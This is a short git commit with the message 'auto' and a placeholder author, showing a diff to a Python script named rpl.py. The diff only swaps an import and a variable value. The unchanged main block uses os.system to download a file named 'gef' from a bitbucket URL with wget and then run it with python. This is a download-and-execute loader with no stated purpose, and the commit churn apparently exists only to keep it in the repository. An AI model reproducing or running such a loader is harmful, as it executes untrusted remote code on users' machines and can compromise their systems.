c9898030f5fdcc45a948ca9d619dd638d68b9c6d
Your Name <you@example.com>
2024-11-01 08:00:44 +0100

    auto

--- rpl.py
+++ rpl.py
@@ -1,4 +1,4 @@
-import os, sys,numbers
-f=18
+import os, sys,time
+p=27
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python gef';os.system(cmd)
